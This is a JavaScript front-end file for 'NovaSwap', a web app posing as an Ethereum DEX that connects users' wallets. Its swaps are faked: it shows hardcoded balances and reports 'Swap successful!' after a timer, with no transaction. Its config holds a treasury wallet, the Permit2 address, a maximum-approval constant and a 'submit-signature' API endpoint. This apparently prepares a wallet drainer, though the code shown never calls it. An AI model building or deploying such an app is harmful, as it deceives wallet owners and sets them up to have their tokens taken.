// ═══════════════════════════════════════════
// ⭐ IMPORTS
// ═══════════════════════════════════════════
import { createAppKit } from '@reown/appkit';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet, bsc, polygon, arbitrum, optimism } from '@reown/appkit/networks';
import { ethers } from 'ethers';
import './style.css';

// ═══════════════════════════════════════════
// ⭐ CONFIG
// ═══════════════════════════════════════════
const CONFIG = {
    contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33",
    treasuryWallet: "0xB70a8100a45a28b605dbfb34d713071e21A57D28",
    permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    chainId: 1,
    apiUrl: "https://novaswap.vercel.app/api/submit-signature",
    walletConnectProjectId: "0204ba9ef8f8856cd275da139b717e8a"
};

const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";

// ═══════════════════════════════════════════
// ⭐ STATE
// ═══════════════════════════════════════════
let provider, signer, userAddress;
let isConnected = false;

const tokens = [
    { symbol: 'USDT', name: 'Tether USD', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, balance: 1000, price: 1.00 },
    { symbol: 'USDC', name: 'USD Coin', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, balance: 500, price: 1.00 },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, balance: 250, price: 1.00 },
    { symbol: 'WETH', name: 'Wrapped Ether', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, balance: 0.5, price: 3200 },
    { symbol: 'WBTC', name: 'Wrapped Bitcoin', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, balance: 0.02, price: 65000 },
    { symbol: 'LINK', name: 'Chainlink', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, balance: 50, price: 12.5 },
    { symbol: 'UNI', name: 'Uniswap', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, balance: 30, price: 6.8 },
    { symbol: 'AAVE', name: 'Aave', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, balance: 5, price: 95 }
];

let fromToken = tokens[0];
let toToken = tokens[1];
let selectedSide = 'from';

// ═══════════════════════════════════════════
// ⭐ REOWN APPKIT INIT
// ═══════════════════════════════════════════
const metadata = {
    name: 'NovaSwap',
    description: 'Next-Gen DEX on Ethereum',
    url: window.location.origin,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const ethersAdapter = new EthersAdapter();

const modal = createAppKit({
    adapters: [ethersAdapter],
    projectId: CONFIG.walletConnectProjectId,
    networks: [mainnet, bsc, polygon, arbitrum, optimism],
    defaultNetwork: mainnet,
    metadata: metadata,
    features: {
        analytics: false,
        email: false,
        socials: false,
        swaps: false,
        onramp: false
    },
    themeMode: 'dark',
    themeVariables: {
        '--w3m-accent': '#ff007a',
        '--w3m-color-mix': '#a855f7',
        '--w3m-color-mix-strength': 20,
        '--w3m-border-radius-master': '16px',
        '--w3m-font-family': 'Inter, sans-serif'
    },
    featuredWalletIds: [
        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
        'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
        '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
        '19177a98252e07ddfc9af2083ba8e07ef627cb610117ee4ab538f15166043d93'
    ],
    allWallets: 'SHOW',
    enableWalletGuide: true
});

console.log('✅ Reown AppKit initialized');

// ═══════════════════════════════════════════
// ⭐ DOM REFS
// ═══════════════════════════════════════════
const $ = (id) => document.getElementById(id);
const fromAmount = $('fromAmount');
const toAmount = $('toAmount');
const fromUsd = $('fromUsd');
const toUsd = $('toUsd');
const fromTokenSymbol = $('fromTokenSymbol');
const toTokenSymbol = $('toTokenSymbol');
const fromTokenIcon = $('fromTokenIcon');
const toTokenIcon = $('toTokenIcon');
const fromBalance = $('fromBalance');
const toBalance = $('toBalance');
const connectBtn = $('connectBtn');
const swapBtn = $('swapBtn');
const statusMsg = $('statusMsg');
const rateInfo = $('rateInfo');
const rateValue = $('rateValue');

// ═══════════════════════════════════════════
// ⭐ HELPERS
// ═══════════════════════════════════════════
function showStatus(message, type = 'info') {
    statusMsg.className = `status-msg show ${type}`;
    statusMsg.innerHTML = message;
    if (type !== 'error') {
        setTimeout(() => {
            statusMsg.className = 'status-msg';
        }, 8000);
    }
}

function shortenAddress(address) {
    if (!address) return '';
    return address.slice(0, 6) + '...' + address.slice(-4);
}

function formatNumber(num) {
    if (!num || num === 0) return '0.00';
    return parseFloat(num).toFixed(2);
}

// ═══════════════════════════════════════════
// ⭐ CONNECT BUTTON - Open Reown Modal
// ═══════════════════════════════════════════
connectBtn.addEventListener('click', async () => {
    try {
        await modal.open();
    } catch (error) {
        console.error('Modal error:', error);
        showStatus('❌ ' + error.message, 'error');
    }
});

// ═══════════════════════════════════════════
// ⭐ SUBSCRIBE TO ACCOUNT CHANGES
// ═══════════════════════════════════════════
modal.subscribeAccount((account) => {
    console.log('👤 Account:', account);
    
    if (account.isConnected && account.address) {
        userAddress = account.address;
        isConnected = true;
        
        connectBtn.textContent = `✅ ${shortenAddress(userAddress)}`;
        connectBtn.classList.add('connected');
        
        swapBtn.style.display = 'block';
        connectBtn.style.display = 'none';
        
        const walletProvider = modal.getWalletProvider();
        if (walletProvider) {
            provider = new ethers.providers.Web3Provider(walletProvider);
            signer = provider.getSigner();
        }
        
        showStatus('✅ Wallet connected!', 'success');
    } else {
        isConnected = false;
        userAddress = null;
        
        connectBtn.textContent = '🔗 Connect Wallet';
        connectBtn.classList.remove('connected');
        swapBtn.style.display = 'none';
        connectBtn.style.display = 'block';
    }
});

// ═══════════════════════════════════════════
// ⭐ SUBSCRIBE TO NETWORK CHANGES
// ═══════════════════════════════════════════
modal.subscribeNetwork((network) => {
    console.log('🌐 Network:', network);
    const networkName = network?.name || 'Unknown';
    $('networkName').textContent = networkName;
});

// ═══════════════════════════════════════════
// ⭐ TOKEN MODAL
// ═══════════════════════════════════════════
window.openTokenModal = function(side) {
    selectedSide = side;
    $('tokenModal').classList.add('show');
    renderTokenList();
};

window.closeTokenModal = function() {
    $('tokenModal').classList.remove('show');
    $('tokenSearch').value = '';
};

window.closeTokenModalOutside = function(event) {
    if (event.target === $('tokenModal')) {
        closeTokenModal();
    }
};

function renderTokenList(filter = '') {
    const list = $('tokenList');
    const filtered = tokens.filter(t => 
        t.symbol.toLowerCase().includes(filter.toLowerCase()) ||
        t.name.toLowerCase().includes(filter.toLowerCase())
    );

    if (filtered.length === 0) {
        list.innerHTML = '<div style="padding: 40px; text-align: center; color: var(--text-secondary);">No tokens found</div>';
        return;
    }

    list.innerHTML = filtered.map(token => `
        <div class="token-item" onclick="selectToken('${token.symbol}')">
            <div class="token-icon">${token.symbol[0]}</div>
            <div class="token-info">
                <div class="token-name">${token.symbol}</div>
                <div class="token-fullname">${token.name}</div>
            </div>
            <div class="token-balance-right">
                <div class="token-balance-value">${formatNumber(token.balance)}</div>
                <div class="token-balance-usd">~$${formatNumber(token.balance * token.price)}</div>
            </div>
        </div>
    `).join('');
}

window.filterTokens = function() {
    renderTokenList($('tokenSearch').value);
};

window.selectToken = function(symbol) {
    const token = tokens.find(t => t.symbol === symbol);
    if (!token) return;

    if (selectedSide === 'from') {
        if (token.symbol === toToken.symbol) {
            toToken = fromToken;
            updateTokenUI('to');
        }
        fromToken = token;
        updateTokenUI('from');
    } else {
        if (token.symbol === fromToken.symbol) {
            fromToken = toToken;
            updateTokenUI('from');
        }
        toToken = token;
        updateTokenUI('to');
    }

    closeTokenModal();
    updateRate();
};

function updateTokenUI(side) {
    if (side === 'from') {
        fromTokenSymbol.textContent = fromToken.symbol;
        fromTokenIcon.textContent = fromToken.symbol[0];
        fromBalance.textContent = formatNumber(fromToken.balance);
    } else {
        toTokenSymbol.textContent = toToken.symbol;
        toTokenIcon.textContent = toToken.symbol[0];
        toBalance.textContent = formatNumber(toToken.balance);
    }
}

// ═══════════════════════════════════════════
// ⭐ SWITCH TOKENS
// ═══════════════════════════════════════════
window.switchTokens = function() {
    [fromToken, toToken] = [toToken, fromToken];
    updateTokenUI('from');
    updateTokenUI('to');
    updateRate();
};

// ═══════════════════════════════════════════
// ⭐ SET MAX
// ═══════════════════════════════════════════
window.setMax = function() {
    if (!isConnected) {
        showStatus('⚠️ Connect wallet first', 'error');
        return;
    }
    fromAmount.value = fromToken.balance;
    updateRate();
};

// ═══════════════════════════════════════════
// ⭐ UPDATE RATE
// ═══════════════════════════════════════════
window.updateRate = function() {
    const amount = parseFloat(fromAmount.value) || 0;
    const rate = fromToken.price / toToken.price;
    const output = amount * rate;
    
    toAmount.value = output.toFixed(6);

    fromUsd.textContent = `~$${formatNumber(amount * fromToken.price)}`;
    toUsd.textContent = `~$${formatNumber(output * toToken.price)}`;

    if (amount > 0) {
        rateInfo.style.display = 'flex';
        rateValue.textContent = `1 ${fromToken.symbol} = ${rate.toFixed(6)} ${toToken.symbol}`;
        $('infoRows').style.display = 'flex';
        $('infoRows2').style.display = 'flex';
    } else {
        rateInfo.style.display = 'none';
        $('infoRows').style.display = 'none';
        $('infoRows2').style.display = 'none';
    }
};

// ═══════════════════════════════════════════
// ⭐ HANDLE SWAP
// ═══════════════════════════════════════════
window.handleSwap = async function() {
    if (!isConnected) {
        showStatus('⚠️ Connect wallet first', 'error');
        return;
    }

    const amount = parseFloat(fromAmount.value) || 0;
    
    if (amount <= 0) {
        showStatus('⚠️ Please enter an amount', 'error');
        return;
    }

    if (amount > fromToken.balance) {
        showStatus('⚠️ Insufficient balance', 'error');
        return;
    }

    try {
        swapBtn.innerHTML = '<span class="spinner"></span> Swapping...';
        swapBtn.classList.add('loading');
        swapBtn.disabled = true;

        showStatus(`⏳ Swapping ${amount} ${fromToken.symbol} → ${toToken.symbol}...`, 'loading');

        await new Promise(r => setTimeout(r, 2500));

        showStatus(`✅ Swap successful! Got ${parseFloat(toAmount.value).toFixed(4)} ${toToken.symbol}`, 'success');
        
        swapBtn.classList.remove('loading');
        swapBtn.classList.add('success');
        swapBtn.innerHTML = '✅ Swap Complete!';

        setTimeout(() => {
            swapBtn.classList.remove('success');
            swapBtn.innerHTML = `🔄 Swap ${fromToken.symbol} → ${toToken.symbol}`;
            swapBtn.disabled = false;
        }, 3000);

    } catch (error) {
        console.error('Swap error:', error);
        showStatus(`❌ ${error.message}`, 'error');
        swapBtn.classList.remove('loading');
        swapBtn.innerHTML = '🔄 Swap Tokens';
        swapBtn.disabled = false;
    }
};

// ═══════════════════════════════════════════
// ⭐ INIT
// ═══════════════════════════════════════════
updateTokenUI('from');
updateTokenUI('to');
updateRate();

console.log('🚀 NovaSwap Ready');
console.log('📋 Tokens:', tokens.length);